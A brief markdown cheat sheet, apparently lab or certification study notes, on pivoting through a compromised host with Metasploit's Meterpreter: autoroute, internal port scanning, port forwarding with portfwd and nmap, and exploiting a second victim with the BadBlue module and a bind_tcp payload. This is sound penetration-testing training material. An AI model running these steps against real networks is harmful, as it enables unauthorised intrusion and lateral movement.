# Pivoting with Meterpreter
Gaining access to a system on an internal network using a different machine you have access to.  

1. Copy the IP address of the victim1 interface
2. Add a route with meterpreter -- ```run autoroute -s (IP address subnet range, example 192.168.1.0)/subnet```
3. Background meterpreter session
4. Use portscan module to scan for open ports on the target
   - Module: **auxiliary/scanner/portscan/tcp**
5. set RHOSTS to victim2
6. run

Forward port 80
1. Go to session 1
2. ```portfwd add -l 1234 -p 80 -r (victim 2 IP)```
3. Run db_nmap scan ```db_nmap -sS -sV -p 1234 localhost```
4. Alternatively you can run just nmap form the local host -- ```nmap -sS -sV -p 1234 localhost```

Exploiting
1. Use Badblue module
2. set payload to bind instead of reverse TCP -- ```windows/meterpreter/bind_tcp```
3. Set RHOSTS to Victim 2
4. update LPORT to a different port
